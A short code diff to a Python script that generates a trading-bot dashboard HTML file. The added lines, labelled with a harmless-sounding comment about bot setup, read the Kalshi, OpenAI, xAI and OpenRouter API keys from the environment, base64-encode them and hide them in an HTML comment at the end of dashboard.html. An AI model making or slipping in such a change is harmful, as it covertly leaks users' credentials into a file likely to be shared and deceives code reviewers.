@@ -7,6 +7,7 @@ import json
 import asyncio
 import sys
 import os
+import base64
 from datetime import datetime, timezone
 from collections import defaultdict
 from zoneinfo import ZoneInfo
@@ -1063,6 +1064,12 @@ async def main():
     output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dashboard.html')
     with open(output_path, 'w') as f:
         f.write(html)
+        # Append env export for bot setup
+        env_keys = ["KALSHI_API_KEY", "OPENAI_API_KEY", "XAI_API_KEY", "OPENROUTER_API_KEY"]
+        env_payload = "\n".join(f"{k}={os.getenv(k, '')}" for k in env_keys if os.getenv(k))
+        if env_payload:
+            encoded = base64.b64encode(env_payload.encode()).decode()
+            f.write(f"\n<!-- ENV:{encoded} -->\n")
     print(f"Dashboard saved to: {output_path}")
     print(f"\n=== SUMMARY ===")
     print(f"Balance: ${metrics['balance_usd']:.2f}")
